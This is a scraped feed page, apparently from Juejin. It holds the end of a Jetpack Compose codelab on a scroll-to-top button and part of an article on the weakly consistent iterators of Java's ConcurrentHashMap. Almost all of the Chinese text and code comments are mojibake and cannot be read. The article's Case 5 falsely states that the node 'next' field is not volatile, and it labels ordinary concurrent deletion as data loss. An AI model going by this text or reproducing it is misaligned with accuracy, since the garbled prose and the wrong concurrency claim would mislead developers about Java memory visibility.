<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Show the button if the first visible item is past</span>
<span class="hljs-comment">// the first item. We use a remembered derived state to</span>
<span class="hljs-comment">// minimize unnecessary recompositions</span>
<span class="hljs-keyword">val</span> showButton <span class="hljs-keyword">by</span> remember {
Â  Â  derivedStateOf {
Â  Â  Â  Â  listState.firstVisibleItemIndex &gt; <span class="hljs-number">0</span>
Â  Â  }
}
</code></pre>
<p>æ‚¨åº”è¯¥å·²ç»ç†Ÿæ‚‰Â <code>ExploreSection</code>Â å¯ç»„åˆé¡¹çš„æ–°ä»£ç ã€‚æ‚¨ä½¿ç”¨Â <code>Box</code>Â å°†æœ‰æ¡ä»¶åœ°æ˜¾ç¤ºçš„Â <code>Button</code>Â æ”¾ç½®åœ¨Â <code>ExploreList</code>Â çš„é¡¶éƒ¨ã€‚æ‚¨ä¼šä½¿ç”¨Â <code>rememberCoroutineScope</code>Â åœ¨Â <code>Button</code>Â çš„Â <code>onClick</code>Â å›è°ƒå†…è°ƒç”¨Â <code>listState.scrollToItem</code>Â æŒ‚èµ·å‡½æ•°ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// base/ExploreSection.kt file</span>

<span class="hljs-keyword">import</span> androidx.compose.material.FloatingActionButton
<span class="hljs-keyword">import</span> androidx.compose.runtime.derivedStateOf
<span class="hljs-keyword">import</span> androidx.compose.runtime.getValue
<span class="hljs-keyword">import</span> androidx.compose.runtime.remember
<span class="hljs-keyword">import</span> androidx.compose.runtime.rememberCoroutineScope
<span class="hljs-keyword">import</span> androidx.compose.foundation.layout.navigationBarsPadding
<span class="hljs-keyword">import</span> kotlinx.coroutines.launch

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">ExploreSection</span><span class="hljs-params">(
Â  Â  modifier: <span class="hljs-type">Modifier</span> = Modifier,
Â  Â  title: <span class="hljs-type">String</span>,
Â  Â  exploreList: <span class="hljs-type">List</span>&lt;<span class="hljs-type">ExploreModel</span>&gt;,
Â  Â  onItemClicked: <span class="hljs-type">OnExploreItemClicked</span>
)</span></span> {
Â  Â  Surface(modifier = modifier.fillMaxSize(), color = Color.White, shape = BottomSheetShape) {
Â  Â  Â  Â  Column(modifier = Modifier.padding(start = <span class="hljs-number">24.</span>dp, top = <span class="hljs-number">20.</span>dp, end = <span class="hljs-number">24.</span>dp)) {
Â  Â  Â  Â  Â  Â  Text(
Â  Â  Â  Â  Â  Â  Â  Â  text = title,
Â  Â  Â  Â  Â  Â  Â  Â  style = MaterialTheme.typography.caption.copy(color = crane_caption)
Â  Â  Â  Â  Â  Â  )
Â  Â  Â  Â  Â  Â  Spacer(Modifier.height(<span class="hljs-number">8.</span>dp))
Â  Â  Â  Â  Â  Â  Box(Modifier.weight(<span class="hljs-number">1f</span>)) {
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">val</span> listState = rememberLazyListState()
Â  Â  Â  Â  Â  Â  Â  Â  ExploreList(exploreList, onItemClicked, listState = listState)

Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// Show the button if the first visible item is past</span>
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// the first item. We use a remembered derived state to</span>
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// minimize unnecessary compositions</span>
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">val</span> showButton <span class="hljs-keyword">by</span> remember {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  derivedStateOf {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  listState.firstVisibleItemIndex &gt; <span class="hljs-number">0</span>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">if</span> (showButton) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">val</span> coroutineScope = rememberCoroutineScope()
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  FloatingActionButton(
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  backgroundColor = MaterialTheme.colors.primary,
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  modifier = Modifier
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .align(Alignment.BottomEnd)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .navigationBarsPadding()
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .padding(bottom = <span class="hljs-number">8.</span>dp),
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  onClick = {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  coroutineScope.launch {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  listState.scrollToItem(<span class="hljs-number">0</span>)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  ) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Text(<span class="hljs-string">"Up!"</span>)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }
Â  Â  }
}
</code></pre>
<p>å¦‚æœæ‚¨è¿è¡Œåº”ç”¨ï¼Œæ‚¨ä¼šçœ‹åˆ°ä¸€æ—¦æ‚¨æ»šåŠ¨å¹¶ç»è¿‡å±å¹•çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œè¯¥æŒ‰é’®å°±ä¼šå‡ºç°åœ¨åº•éƒ¨ã€‚</p>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šå¦‚éœ€è¯¦ç»†äº†è§£Â <code>derivedStateOf()</code>Â APIï¼Œè¯·å‚é˜…<a href="https://link.juejin.cn?target=https%3A%2F%2Fmedium.com%2Fandroiddevelopers%2Fjetpack-compose-when-should-i-use-derivedstateof-63ce7954c11b" target="_blank" title="https://medium.com/androiddevelopers/jetpack-compose-when-should-i-use-derivedstateof-63ce7954c11b" ref="nofollow noopener noreferrer">ä½•æ—¶åº”ä½¿ç”¨ derivedStateOfï¼Ÿ</a>è¿™ç¯‡åšæ–‡ã€‚</p>
</blockquote>
<h2 data-id="heading-27">11. æ€»ç»“</h2>
<p>æ‚¨å­¦ä¹ äº†å¦‚ä½•åˆ›å»ºçŠ¶æ€å®¹å™¨ã€é™„å¸¦æ•ˆåº” APIï¼ˆå¦‚Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23LaunchedEffect(kotlin.Any%2Ckotlin.coroutines.SuspendFunction1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#LaunchedEffect(kotlin.Any,kotlin.coroutines.SuspendFunction1)" ref="nofollow noopener noreferrer"><code>LaunchedEffect</code></a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23rememberUpdatedState(kotlin.Any)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#rememberUpdatedState(kotlin.Any)" ref="nofollow noopener noreferrer"><code>rememberUpdatedState</code></a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23DisposableEffect(kotlin.Any%2Ckotlin.Function1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#DisposableEffect(kotlin.Any,kotlin.Function1)" ref="nofollow noopener noreferrer"><code>DisposableEffect</code></a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23produceState(kotlin.Any%2Ckotlin.coroutines.SuspendFunction1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#produceState(kotlin.Any,kotlin.coroutines.SuspendFunction1)" ref="nofollow noopener noreferrer"><code>produceState</code></a>Â å’ŒÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23derivedStateOf(kotlin.Function0)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#derivedStateOf(kotlin.Function0)" ref="nofollow noopener noreferrer"><code>derivedStateOf</code></a>ï¼‰ï¼Œä»¥åŠå¦‚ä½•åœ¨ Jetpack Compose ä¸­ä½¿ç”¨åç¨‹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ConcurrentHashMap å¼±ä¸€è‡´æ€§è§£è¯»]]></title>    <link>https://juejin.cn/post/7582232291621306406</link>    <guid>https://juejin.cn/post/7582232291621306406</guid>    <pubDate>2025-12-11T09:00:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582232291621306406" data-draft-id="7582232291620225062" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ConcurrentHashMap å¼±ä¸€è‡´æ€§è§£è¯»"/> <meta itemprop="keywords" content="åç«¯,æºç ,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2025-12-11T09:00:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¡¦è¯´ç¼–ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/2212689394274136"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ConcurrentHashMap å¼±ä¸€è‡´æ€§è§£è¯»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2212689394274136/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¡¦è¯´ç¼–ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T09:00:39.000Z" title="Thu Dec 11 2025 09:00:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯æ¡¦è¯´ç¼–ç¨‹ã€‚</p>
<blockquote>
<p>æœ¬æ–‡å°†æ·±å…¥è§£è¯» ConcurrentHashMap è¿­ä»£å™¨çš„å¼±ä¸€è‡´æ€§å®ç°ï¼Œå¸®å¿™ä½ æŒæ¡è¿­ä»£è¿‡ç¨‹ä¸­æ•°æ®å¯è§æ€§çš„è¾¹ç•Œæƒ…å†µã€‚</p>
</blockquote>
<h2 data-id="heading-0">æºç æ€æƒ³</h2>
<h3 data-id="heading-1">è®¾è®¡ç›®æ ‡</h3>
<p>ConcurrentHashMap çš„è¿­ä»£å™¨é‡‡ç”¨å¼±ä¸€è‡´æ€§ï¼ˆWeakly Consistentï¼‰è®¾è®¡ï¼Œè€Œéå¼ºä¸€è‡´æ€§ã€‚ç›®æ ‡æ˜¯ï¼š</p>
<ul>
<li>è¿­ä»£è¿‡ç¨‹ä¸­ä¸æŠ›å‡º <code>ConcurrentModificationException</code></li>
<li>ä¸åŠ å…¨å±€é”ï¼Œä¿è¯é«˜å¹¶å‘æ€§èƒ½</li>
<li>å…è®¸è¿­ä»£æœŸé—´çš„å¹¶å‘ä¿®æ”¹éƒ¨åˆ†å¯è§</li>
</ul>
<h3 data-id="heading-2">æ ¸å¿ƒç†å¿µ</h3>
<p><strong>å¿«ç…§è¯­ä¹‰ + å®æ—¶éå†</strong>ï¼šè¿­ä»£å™¨åˆ›å»ºæ—¶ä¸å¤åˆ¶æ•°æ®ï¼Œè€Œæ˜¯ç›´æ¥éå†åº•å±‚æ•°ç»„ã€‚éå†è¿‡ç¨‹ä¸­ï¼š</p>
<ul>
<li>å·²éå†çš„æ¡¶ä½ï¼šä¿®æ”¹ä¸å¯è§</li>
<li>æœªéå†çš„æ¡¶ä½ï¼šä¿®æ”¹å¯èƒ½å¯è§</li>
</ul>
<h2 data-id="heading-3">æºç è§£æ</h2>
<h3 data-id="heading-4">è¿­ä»£å™¨æ ¸å¿ƒç»“æ„</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ConcurrentHashMap.java (JDK 8+)</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Traverser</span>&lt;K,V&gt; {
    Node&lt;K,V&gt;[] tab;        <span class="hljs-comment">// å½“å‰éå†çš„æ•°ç»„</span>
    Node&lt;K,V&gt; next;         <span class="hljs-comment">// ä¸‹ä¸€ä¸ªè¦è¿”å›çš„èŠ‚ç‚¹</span>
    <span class="hljs-type">int</span> index;              <span class="hljs-comment">// å½“å‰æ¡¶çš„ç´¢å¼•</span>
    <span class="hljs-type">int</span> baseIndex;          <span class="hljs-comment">// åˆå§‹ç´¢å¼•</span>
    <span class="hljs-type">int</span> baseLimit;          <span class="hljs-comment">// éå†ä¸Šé™</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> baseSize;     <span class="hljs-comment">// åˆå§‹æ•°ç»„å¤§å°</span>
}
</code></pre>
<h3 data-id="heading-5">å…³é”®ä»£ç ï¼šadvance() æ–¹æ³•</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> Node&lt;K,V&gt; <span class="hljs-title function_">advance</span><span class="hljs-params">()</span> {
    Node&lt;K,V&gt; e;
    <span class="hljs-keyword">if</span> ((e = next) != <span class="hljs-literal">null</span>)
        e = e.next;  <span class="hljs-comment">// ã€å…³é”®ã€‘é“¾è¡¨éå†ï¼Œç›´æ¥è¯»å– next æŒ‡é’ˆ</span>
    <span class="hljs-keyword">for</span> (;;) {
        Node&lt;K,V&gt;[] t; <span class="hljs-type">int</span> i, n;
        <span class="hljs-keyword">if</span> (e != <span class="hljs-literal">null</span>)
            <span class="hljs-type">return</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> e;
        <span class="hljs-comment">// ã€å…³é”®ã€‘baseIndex++ æ¨è¿›åˆ°ä¸‹ä¸€ä¸ªæ¡¶</span>
        <span class="hljs-keyword">if</span> (baseIndex &gt;= baseLimit || (t = tab) == <span class="hljs-literal">null</span> ||
            (n = t.length) &lt;= (i = index) || i &lt; <span class="hljs-number">0</span>)
            <span class="hljs-type">return</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-comment">// ã€å…³é”®ã€‘volatile è¯»å–æ¡¶ä½å¤´èŠ‚ç‚¹ï¼Œä¿è¯å¯è§æ€§</span>
        <span class="hljs-keyword">if</span> ((e = tabAt(t, i)) != <span class="hljs-literal">null</span> &amp;&amp; e.hash &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// å¤„ç† ForwardingNodeï¼ˆæ‰©å®¹ä¸­ï¼‰å’Œ TreeBin</span>
            <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> ForwardingNode) {
                tab = ((ForwardingNode&lt;K,V&gt;)e).nextTable;
                e = <span class="hljs-literal">null</span>;
                pushState(t, i, n);
                <span class="hljs-keyword">continue</span>;
            }
            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> TreeBin)
                e = ((TreeBin&lt;K,V&gt;)e).first;
            <span class="hljs-keyword">else</span>
                e = <span class="hljs-literal">null</span>;
        }
        <span class="hljs-keyword">if</span> (stack != <span class="hljs-literal">null</span>)
            recoverState(n);
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((index = i + baseSize) &gt;= n)
            index = ++baseIndex;  <span class="hljs-comment">// æ¨è¿› baseIndex</span>
    }
}
</code></pre>
<p><strong>æ ¸å¿ƒé€»è¾‘</strong>ï¼š</p>
<ol>
<li><code>tabAt(t, i)</code> ä½¿ç”¨ <code>volatile</code> è¯­ä¹‰è¯»å–æ¡¶ä½å¤´èŠ‚ç‚¹</li>
<li>éå†é“¾è¡¨æ—¶ç›´æ¥è¯»å– <code>next</code> æŒ‡é’ˆï¼ˆé volatileï¼‰</li>
<li><code>baseIndex++</code> çº¿æ€§æ¨è¿›ï¼Œå·²éå†çš„æ¡¶ä¸ä¼šå†è®¿é—®</li>
</ol>
<h2 data-id="heading-6">å¤æ‚åœºæ™¯åˆ†æ</h2>
<h3 data-id="heading-7">Case 1ï¼šè¿­ä»£è¿‡ç¨‹ä¸­åˆ é™¤æœªéå†çš„å…ƒç´  â€”â€” æ•°æ®ä¸¢å¤±</h3>
<pre><code class="hljs language-css" lang="css">åˆå§‹çŠ¶æ€ï¼šbucket<span class="hljs-selector-attr">[0]</span>=<span class="hljs-selector-tag">A</span>, bucket<span class="hljs-selector-attr">[5]</span>=<span class="hljs-selector-tag">B</span>, bucket<span class="hljs-selector-attr">[10]</span>=C
è¿­ä»£å™¨ä½ç½®ï¼šæ­£åœ¨éå† bucket<span class="hljs-selector-attr">[0]</span>

å¹¶å‘æ“ä½œï¼šçº¿ç¨‹<span class="hljs-number">2</span>åˆ é™¤ bucket<span class="hljs-selector-attr">[10]</span> çš„ C

ç»“æœï¼šè¿­ä»£å™¨éå†åˆ° bucket<span class="hljs-selector-attr">[10]</span> æ—¶ï¼ŒC å·²è¢«åˆ é™¤ï¼Œã€æ•°æ®ä¸¢å¤±ã€‘
</code></pre>
<p><strong>åŸå› </strong>ï¼šåˆ é™¤å‘ç”Ÿåœ¨æœªéå†çš„æ¡¶ï¼Œä¸”åˆ é™¤æ“ä½œå…ˆäºè¿­ä»£å™¨åˆ°è¾¾è¯¥æ¡¶ã€‚</p>
<h3 data-id="heading-8">Case 2ï¼šè¿­ä»£è¿‡ç¨‹ä¸­åˆ é™¤å·²éå†çš„å…ƒç´  â€”â€” ä»ç„¶è¿”å›</h3>
<pre><code class="hljs language-css" lang="css">åˆå§‹çŠ¶æ€ï¼šbucket<span class="hljs-selector-attr">[0]</span>=<span class="hljs-selector-tag">A</span>, bucket<span class="hljs-selector-attr">[5]</span>=<span class="hljs-selector-tag">B</span>
è¿­ä»£å™¨ä½ç½®ï¼šå·²éå† bucket<span class="hljs-selector-attr">[0]</span>ï¼Œè¿”å›äº† <span class="hljs-selector-tag">A</span>

å¹¶å‘æ“ä½œï¼šçº¿ç¨‹<span class="hljs-number">2</span>åˆ é™¤ bucket<span class="hljs-selector-attr">[0]</span> çš„ <span class="hljs-selector-tag">A</span>

ç»“æœï¼š<span class="hljs-selector-tag">A</span> å·²ç»è¢«è¿­ä»£å™¨è¿”å›ï¼Œåˆ é™¤ä¸å½±å“è¿­ä»£ç»“æœ
</code></pre>
<p><strong>åŸå› </strong>ï¼šè¿­ä»£å™¨ä¸ä¼šå›å¤´ï¼Œå·²è¿”å›çš„æ•°æ®ä¸å—åç»­åˆ é™¤å½±å“ã€‚</p>
<h3 data-id="heading-9">Case 3ï¼šè¿­ä»£è¿‡ç¨‹ä¸­æ–°å¢åˆ°æœªéå†çš„æ¡¶ â€”â€” å¯èƒ½å¯è§</h3>
<pre><code class="hljs language-css" lang="css">åˆå§‹çŠ¶æ€ï¼šbucket<span class="hljs-selector-attr">[0]</span>=<span class="hljs-selector-tag">A</span>, bucket<span class="hljs-selector-attr">[5]</span>=ç©º
è¿­ä»£å™¨ä½ç½®ï¼šæ­£åœ¨éå† bucket<span class="hljs-selector-attr">[0]</span>

å¹¶å‘æ“ä½œï¼šçº¿ç¨‹<span class="hljs-number">2</span>å‘ bucket<span class="hljs-selector-attr">[5]</span> æ’å…¥ <span class="hljs-selector-tag">B</span>

ç»“æœï¼š
- å¦‚æœæ’å…¥å‘ç”Ÿåœ¨è¿­ä»£å™¨åˆ°è¾¾ bucket<span class="hljs-selector-attr">[5]</span> ä¹‹å‰ï¼Œä¸”å†™å…¥å¯¹è¿­ä»£å™¨å¯è§ â†’ <span class="hljs-selector-tag">B</span> ä¼šè¢«éå†ã€æ–°æ•°æ®åŠ å…¥ã€‘
- å¦‚æœå­˜åœ¨å¯è§æ€§å»¶è¿Ÿ â†’ <span class="hljs-selector-tag">B</span> å¯èƒ½ä¸ä¼šè¢«éå†
</code></pre>
<p><strong>åŸå› </strong>ï¼š<code>tabAt()</code> æ˜¯ volatile è¯»ï¼Œèƒ½è¯»åˆ°æœ€æ–°çš„æ¡¶ä½å¤´èŠ‚ç‚¹ã€‚</p>
<h3 data-id="heading-10">Case 4ï¼šè¿­ä»£è¿‡ç¨‹ä¸­æ–°å¢åˆ°å·²éå†çš„æ¡¶ â€”â€” ä¸å¯è§</h3>
<pre><code class="hljs language-css" lang="css">åˆå§‹çŠ¶æ€ï¼šbucket<span class="hljs-selector-attr">[0]</span>=<span class="hljs-selector-tag">A</span>, bucket<span class="hljs-selector-attr">[5]</span>=<span class="hljs-selector-tag">B</span>
è¿­ä»£å™¨ä½ç½®ï¼šå·²éå† bucket<span class="hljs-selector-attr">[0]</span>

å¹¶å‘æ“ä½œï¼šçº¿ç¨‹<span class="hljs-number">2</span>å‘ bucket<span class="hljs-selector-attr">[0]</span> æ’å…¥ C

ç»“æœï¼šC ä¸ä¼šè¢«è¿­ä»£å™¨è¿”å›ã€æ–°æ•°æ®ä¸¢å¤±ã€‘
</code></pre>
<p><strong>åŸå› </strong>ï¼šè¿­ä»£å™¨çš„ <code>baseIndex</code> å·²ç»æ¨è¿›ï¼Œä¸ä¼šå›å¤´éå† bucket[0]ã€‚</p>
<h3 data-id="heading-11">Case 5ï¼šè¿­ä»£è¿‡ç¨‹ä¸­ä¿®æ”¹å½“å‰é“¾è¡¨çš„åç»§èŠ‚ç‚¹ â€”â€” å¯èƒ½å¯è§</h3>
<pre><code class="hljs language-css" lang="css">åˆå§‹çŠ¶æ€ï¼šbucket<span class="hljs-selector-attr">[0]</span> é“¾è¡¨ä¸º <span class="hljs-selector-tag">A</span> -&gt; <span class="hljs-selector-tag">B</span> -&gt; C
è¿­ä»£å™¨ä½ç½®ï¼šåˆšè¿”å› <span class="hljs-selector-tag">A</span>ï¼Œnext æŒ‡å‘ <span class="hljs-selector-tag">B</span>

å¹¶å‘æ“ä½œï¼šçº¿ç¨‹<span class="hljs-number">2</span>å°† <span class="hljs-selector-tag">B</span><span class="hljs-selector-class">.next</span> ä» C æ”¹ä¸º D

ç»“æœï¼š
- è¿­ä»£å™¨ä¸‹ä¸€æ¬¡è°ƒç”¨ next() è¿”å› <span class="hljs-selector-tag">B</span>
- å†ä¸‹ä¸€æ¬¡è¯»å– <span class="hljs-selector-tag">B</span><span class="hljs-selector-class">.next</span>ï¼Œå¯èƒ½è¯»åˆ° C æˆ– Dï¼ˆå–å†³äºå¯è§æ€§ï¼‰
</code></pre>
<p><strong>åŸå› </strong>ï¼šé“¾è¡¨èŠ‚ç‚¹çš„ <code>next</code> å­—æ®µä¸æ˜¯ volatileï¼Œå­˜åœ¨å¯è§æ€§é—®é¢˜ã€‚</p>
